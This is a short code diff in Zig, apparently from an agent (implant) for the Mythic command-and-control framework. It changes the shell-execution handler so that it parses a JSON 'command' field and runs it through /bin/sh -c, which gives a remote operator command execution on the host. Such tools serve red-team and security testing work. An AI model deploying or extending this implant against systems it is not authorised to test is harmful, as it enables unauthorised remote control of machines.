@@ -43,9 +43,23 @@ pub const CommandExecutor = struct {
     
     // Execute shell command
     fn executeShell(self: *CommandExecutor, task: MythicTask) !MythicResponse {
+        const ShellParameters = struct {
+            command: []const u8,
+        };
+        const parsed = try json.parseFromSlice(ShellParameters, self.allocator, task.parameters, .{});
+        defer parsed.deinit();
+        const command = parsed.value.command;
+        if (command.len == 0) {
+            return MythicResponse{
+                .task_id = task.id,
+                .user_output = "No command provided",
+                .completed = true,
+                .status = "error",
+            };
+        }
         const result = std.process.Child.run(.{
             .allocator = self.allocator,
-            .argv = &[_][]const u8{ "/bin/sh", "-c", task.parameters },
+            .argv = &[_][]const u8{ "/bin/sh", "-c", command },
         }) catch |err| {
             return MythicResponse{
                 .task_id = task.id,
